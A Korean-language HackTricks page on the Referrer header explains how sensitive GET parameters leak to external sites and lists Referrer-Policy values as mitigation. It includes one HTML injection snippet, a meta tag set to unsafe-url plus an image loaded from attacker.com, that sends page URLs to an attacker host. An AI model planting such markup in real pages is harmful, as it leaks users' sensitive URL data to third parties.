{% hint style="success" %}
AWS 해킹을 배우고 실습하세요: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹을 배우고 실습하세요: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소에 PR을 제출하여 해킹 트릭을 공유하세요.

</details>
{% endhint %}


# Referrer 헤더 및 정책

Referrer는 브라우저가 이전에 방문한 페이지를 나타내는 헤더입니다.

## 민감한 정보 노출

웹 페이지 내에서 어떤 시점에서든 GET 요청 매개변수에 민감한 정보가 위치하고 있거나, 페이지에 외부 소스로 연결된 링크가 포함되어 있거나 공격자가 사용자가 공격자가 제어하는 URL을 방문하도록 만들거나 제안할 수 있는 경우(사회 공학), 최신 GET 요청 내에서 민감한 정보를 유출할 수 있습니다.

## 완화

브라우저가 다른 웹 응용 프로그램으로 민감한 정보를 보내지 않도록 하는 **Referrer-policy**를 따르도록 할 수 있습니다.
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## 대응 방안

HTML 메타 태그를 사용하여 이 규칙을 재정의할 수 있습니다 (공격자는 HTML 삽입을 악용해야 함):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## 방어

URL의 GET 매개변수나 경로에 민감한 데이터를 절대 넣지 마십시오.


{% hint style="success" %}
AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* 해킹 트릭을 공유하려면 [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>
{% endhint %}
